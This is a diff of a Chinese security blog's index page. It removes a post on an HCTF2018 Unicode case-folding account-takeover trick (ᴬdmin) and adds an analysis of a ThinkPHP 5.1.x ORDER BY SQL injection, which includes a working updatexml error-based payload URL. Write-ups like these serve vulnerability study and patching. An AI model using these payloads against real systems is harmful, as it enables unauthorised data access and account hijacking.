@@ -229,151 +229,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/21/Unicode安全/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="boogle">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Boogle's Blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/21/Unicode安全/" itemprop="url">Unicode安全</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-21T15:44:52+08:00">
-                2019-02-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>结合HCTF2018的一道web题：admin</p>
-<p><a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">题目源码</a></p>
-<p>这道题比较有意思，思路偏门新奇。<br>题目的目标是以admin身份登陆，下载源码之后，是一个python基于flask框架写的一个web程序，审计代码之后发现，在注册、登陆、修改密码时都用到了strlower这个函数将username转化为小写。<br>而这里有一个偏门的小知识，那就是unicode安全，具体参考：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">Unicode安全</a><br>我们这里可以利用的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬ -&gt; A -&gt; a</span><br></pre></td></tr></table></figure></p>
-<p>也就是我们注册一个 ᴬdmin的用户，注册时经过strlower转化会变为 Admin,而再修改密码时，又会转化为 admin。从而达到最终越权的目的。<br><img src="https://i.loli.net/2018/11/12/5be98862c3d79.png" alt></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/21/linux端口转发/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1754,6 +1609,159 @@
 <p><a href="https://imgchr.com/i/kiL0cd" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/21/kiL0cd.png" alt="kiL0cd.png"></a></p>
 <p>执行结果<br><img src="https://s2.ax1x.com/2019/01/22/kiLW9g.png" alt="kiLW9g.png"></p>
 <h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>但是这个漏洞比较鸡肋的是查询<strong>user() database()</strong>等，不能进行子查询。原因是因为thinkphp框架使用参数化查询PDO，将参数与查询语句分离，降低了漏洞风险，后门将会针对该框架的PDO进行分析。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/24/thinkphp-5-1-x-order-by注入分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="boogle">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogle's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/24/thinkphp-5-1-x-order-by注入分析/" itemprop="url">thinkphp 5.1.x order by注入分析</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-24T22:02:38+08:00">
+                2019-01-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-影响版本"><a href="#0x00-影响版本" class="headerlink" title="0x00 影响版本"></a>0x00 影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本</span><br><span class="line"></span><br><span class="line">thinkphp5.1.x &lt; 5.1.23</span><br></pre></td></tr></table></figure>
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>首先看一下官方commit<br><img src="https://s2.ax1x.com/2019/01/23/kAaYdK.png" alt="kAaYdK.png"></p>
+<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp5.1-master/public/index.php?order[id`,%27boo%27)|%20updatexml(1,concat(0x3c,user(),0x3e),1)%23][]=1</span><br></pre></td></tr></table></figure></p>
+<p>由补丁可以看出，当val是数组时增加了对key的判断，那么问题应该出在未对key进行过滤，而key被带进入parseOrderField中，跟踪一下。这里getOptions()函数是获取了当前要查询的参数，getFieldsBind()函数是获取数据表绑定信息。<br><img src="https://s2.ax1x.com/2019/01/23/kAsFtP.png" alt="kAsFtP.png"><br>查看最后的return语句,这里将val拼接到key的后面，那么这个val值其实是不用的，只要key值可控，就可以将后面的注释掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return &apos;field(&apos; . $this-&gt;parseKey($query, $key, true) . &apos;,&apos; . implode(&apos;,&apos;, $val) . &apos;)&apos; . $sort;</span><br></pre></td></tr></table></figure></p>
+<p>因为这里parseKey对key进行了处理，继续跟进。<br><img src="https://s2.ax1x.com/2019/01/23/kAso38.png" alt="kAso38.png"><br>这里对key值进行了多重判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. is_numeric判断，如果是数字，则返回，不是的话继续向下执行</span><br><span class="line"></span><br><span class="line">2. 判断$key是否属于Expression类</span><br><span class="line"></span><br><span class="line">3. strpos($key, &apos;-&gt;&apos;) &amp;&amp; false ===strpos($key, &apos;(&apos;) </span><br><span class="line"></span><br><span class="line">4. (&apos;*&apos; != $key &amp;&amp; ($strict || !preg_match(&apos;/[,\&apos;\&quot;\*\(\)`.\s]/&apos;, $key)))</span><br></pre></td></tr></table></figure></p>
+<p>这里注入的sql语句进入了第四个判断,即将key用<strong><code></code></strong>包裹。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (&apos;*&apos; != $key &amp;&amp; ($strict || !preg_match(&apos;/[,\&apos;\&quot;\*\(\)`.\s]/&apos;, $key))) &#123;</span><br><span class="line">            $key = &apos;`&apos; . $key . &apos;`&apos;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后回到上一层,进行拼接返回<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return &apos;field(&apos; . $this-&gt;parseKey($query, $key, true) . &apos;,&apos; . implode(&apos;,&apos;, $val) . &apos;)&apos; . $sort;</span><br></pre></td></tr></table></figure></p>
+<p>拼接得到   <strong>field(<code>SQL注入语句</code>,$val)</strong> 可以看到我们需要对<strong>`</strong>闭合并且注释掉后面的内容。</p>
+<p>两外field()函数，field()函数必须指定大于等于两个字段才可以正常运行，否则就会报错。而且当field中的参数不是字符串或数字时，指定的参数必须是正确的表字段，否则程序就会报错。这里由于程序会在第一个字段中加 <strong> <code></code> </strong>限制,所以必须指定正确的字段名称。第二个字段没有限制，可以指定字符串或数字。</p>
+<p>那么payload 可以是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp5.1-master/public/index.php?order[id`,&apos;boo&apos;)|%20updatexml(1,concat(0x3c,user(),0x3e),1)#][]=1</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-后记"><a href="#0x02-后记" class="headerlink" title="0x02 后记"></a>0x02 后记</h2><p>因为tp5 pdo的原因，还是不能进行子查询。</p>
+<p><a href="https://www.freebuf.com/column/185415.html" target="_blank" rel="noopener">天融信关于ThinkPHP 5.1.x SQL注入漏洞分析</a></p>
 
           
         
